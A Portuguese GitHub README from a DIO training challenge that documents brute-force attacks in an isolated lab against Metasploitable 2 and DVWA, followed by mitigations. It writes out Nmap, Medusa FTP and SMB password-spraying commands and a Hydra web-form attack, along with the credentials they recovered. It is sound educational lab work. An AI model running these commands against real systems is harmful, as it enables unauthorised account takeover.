# 🔐 Projeto DIO — Ataques Brute Force com Medusa e Kali Linux

## 📚 Descrição

Este projeto foi desenvolvido como parte do desafio da DIO com foco em testes de segurança ofensiva utilizando Kali Linux, Medusa e ambientes vulneráveis.

O objetivo foi compreender o funcionamento de ataques de força bruta em diferentes serviços e analisar medidas de mitigação utilizadas em ambientes corporativos.

---

# 🎯 Objetivos

- Simular ataques de força bruta em ambiente controlado;
- Utilizar ferramentas de pentest no Kali Linux;
- Explorar serviços vulneráveis no Metasploitable 2;
- Documentar procedimentos técnicos;
- Demonstrar conhecimentos básicos em segurança ofensiva.

---

# 🖥️ Ambiente Utilizado

| Máquina | Sistema |
|---|---|
| Atacante | Kali Linux |
| Alvo | Metasploitable 2 |
| Virtualização | VirtualBox |

---

# 🌐 Configuração de Rede

As máquinas virtuais foram configuradas utilizando rede Host-Only no VirtualBox para permitir comunicação isolada entre atacante e alvo.

---

# 🛠️ Ferramentas Utilizadas

- Medusa
- Hydra
- Nmap
- Enum4linux
- DVWA
- FTP
- SMB

---

# 📁 Estrutura do Projeto

```bash
dio-bruteforce/
│
├── README.md
├── users.txt
├── passwords.txt
└── images/
    ├── kali.png
    ├── nmap.png
    ├── ftp-bruteforce.png
    ├── dvwa.png
    └── smb.png
```

---

# 🔎 Reconhecimento de Serviços

Inicialmente foi realizado o reconhecimento da máquina alvo utilizando Nmap.

## Comando utilizado

```bash
nmap -sV 192.168.56.101
```

## Resultado esperado

```bash
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

O scan permitiu identificar serviços vulneráveis disponíveis na máquina Metasploitable 2.

---

# 🔓 Ataque Brute Force FTP com Medusa

## Objetivo

Realizar ataque de força bruta no serviço FTP utilizando listas simples de usuários e senhas.

---

## Wordlist de Usuários

Arquivo: `users.txt`

```txt
admin
root
msfadmin
user
test
```

---

## Wordlist de Senhas

Arquivo: `passwords.txt`

```txt
123456
password
admin
root
msfadmin
123123
```

---

## Comando executado

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
```

---

## Resultado obtido

```bash
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin
```

O ataque identificou credenciais válidas no serviço FTP.

---

# ✅ Validação do Acesso FTP

Após identificar as credenciais, foi realizado acesso manual ao FTP.

## Comando

```bash
ftp 192.168.56.101
```

## Credenciais utilizadas

```txt
Usuário: msfadmin
Senha: msfadmin
```

O login foi realizado com sucesso.

---

# 🌐 Ataque em Aplicação Web DVWA

## Objetivo

Simular brute force em formulário web vulnerável utilizando Hydra.

---

## Acesso ao DVWA

```txt
http://192.168.56.101/dvwa
```

---

## Credenciais padrão do DVWA

```txt
Usuário: admin
Senha: password
```

---

## Configuração de Segurança

O nível de segurança do DVWA foi configurado como:

```txt
Low
```

---

## Comando Hydra

```bash
hydra -l admin -P passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## Resultado

```bash
login: admin
password: password
```

O teste demonstrou como aplicações sem proteção adequada podem ser vulneráveis a ataques automatizados.

---

# 🖥️ Enumeração SMB

## Objetivo

Enumerar usuários e testar password spraying no SMB.

---

## Enumeração com Enum4linux

```bash
enum4linux 192.168.56.101
```

A enumeração permitiu identificar informações sobre compartilhamentos e possíveis usuários do sistema.

---

# 🔐 Password Spraying SMB com Medusa

## Comando executado

```bash
medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
```

---

# ⚠️ Vulnerabilidades Identificadas

- Senhas fracas;
- Uso de credenciais padrão;
- Serviços inseguros habilitados;
- Ausência de bloqueio após múltiplas tentativas;
- Falta de autenticação multifator.

---

# 🛡️ Medidas de Mitigação

## FTP

- Desativar FTP inseguro;
- Utilizar SFTP;
- Aplicar políticas fortes de senha;
- Implementar MFA;
- Limitar tentativas de login.

---

## Aplicações Web

- Implementar CAPTCHA;
- Bloquear tentativas excessivas;
- Utilizar MFA;
- Monitorar logs;
- Aplicar rate limiting.

---

## SMB

- Desabilitar SMBv1;
- Aplicar política de bloqueio;
- Restringir acessos;
- Monitorar autenticações suspeitas.

---

# 📸 Evidências

As evidências dos testes foram organizadas na pasta:

```bash
/images
```

Exemplos:
- Scan Nmap;
- Execução do Medusa;
- Resultado do Hydra;
- Enumeração SMB;
- Login realizado com sucesso.

---

# 📖 Aprendizados

Durante o desenvolvimento deste projeto foi possível compreender:

- Funcionamento de ataques de força bruta;
- Importância de senhas fortes;
- Uso de ferramentas ofensivas em ambiente controlado;
- Reconhecimento de vulnerabilidades comuns;
- Necessidade de medidas preventivas.

---

# ⚠️ Aviso Legal

Este projeto foi desenvolvido exclusivamente para fins educacionais em ambiente controlado e autorizado.

---

# 👨‍💻 Autor

Projeto desenvolvido para o desafio prático da DIO.
